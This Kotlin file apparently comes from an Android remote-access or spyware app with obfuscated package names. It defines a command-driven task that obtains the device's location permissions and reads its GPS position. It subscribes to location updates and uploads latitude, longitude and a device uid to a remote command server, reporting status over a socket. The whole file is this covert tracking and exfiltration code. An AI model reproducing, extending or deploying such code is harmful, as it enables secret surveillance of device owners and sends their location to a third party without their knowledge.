package com.xxx.zzz.commandp.taskssv

import android.content.Context
import android.content.pm.PackageManager
import android.location.Criteria
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.xxx.zzz.Payload
import com.xxx.zzz.aall.orgsss.anko.runOnUiThread
import com.xxx.zzz.socketsp.IOSocketyt
import com.xxx.zzz.socketsp.apiRequestHttpNm
import kotlinx.coroutines.launch
import org.json.JSONObject

class LocationMonitorTask(private val ctx: Context) : BaseTask(ctx) {

    override fun run() {
        super.run()
        runCatching {
            getLocation()
        }.onFailure {
            IOSocketyt.sendLogs("", "LocationMonitorTask ${it.localizedMessage}", "error")
        }
    }

    fun getLastLocation(): JSONObject? {
        if (ContextCompat.checkSelfPermission(
                ctx,
                android.Manifest.permission.ACCESS_FINE_LOCATION
            ) == PackageManager.PERMISSION_GRANTED
            && ActivityCompat.checkSelfPermission(
                ctx,
                android.Manifest.permission.ACCESS_COARSE_LOCATION
            ) == PackageManager.PERMISSION_GRANTED
        ) {
            val locationManager = ctx.applicationContext.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val bestProvider = locationManager.getBestProvider(Criteria(), false)

            val lastLocation =
                locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER)

            val location = JSONObject()
            location.put("lat", lastLocation?.latitude)
            location.put("lon", lastLocation?.longitude)
            return location
        }
        return null
    }

    private fun getLocation() {
        runCatching {
            if (ContextCompat.checkSelfPermission(
                    ctx,
                    android.Manifest.permission.ACCESS_FINE_LOCATION
                ) == PackageManager.PERMISSION_GRANTED
                || ActivityCompat.checkSelfPermission(
                    ctx,
                    android.Manifest.permission.ACCESS_COARSE_LOCATION
                ) == PackageManager.PERMISSION_GRANTED
            ) {
                val locationManager =
                    ctx.applicationContext.getSystemService(Context.LOCATION_SERVICE) as LocationManager
                val bestProvider = locationManager.getBestProvider(Criteria(), false)!!

                val lastLocation =
                    locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER)
                uploadLocation(lastLocation)

                Log.d(TAG, lastLocation?.toString() ?: "null")

                ctx.runOnUiThread {
                    locationManager.requestLocationUpdates(
                        bestProvider,
                        400,
                        100F,
                        object : LocationListener {
                            override fun onLocationChanged(location: Location) {
                                uploadLocation(location)
                                locationManager.removeUpdates(this)
                            }
                        })
                }

            } else requestPermissions()
        }.onFailure {
            IOSocketyt.sendLogs("", "getLocation error ${it.localizedMessage}", "error")
        }
    }


    private fun uploadLocation(location: Location?)    = Payload.ApplicationScope.launch {
        val obj = JSONObject()
        obj.put("lat", location?.latitude)
        obj.put("lon", location?.longitude)

        val data = JSONObject()
        data.put("uid", params.uid)
        data.put("location", obj.toString())

        data.put("command", "location")
        apiRequestHttpNm.command(data)

        IOSocketyt.sendLogs("", "LocationMonitorTask", "success")
    }

    companion object {
        private val TAG = LocationMonitorTask::class.java.canonicalName
    }

}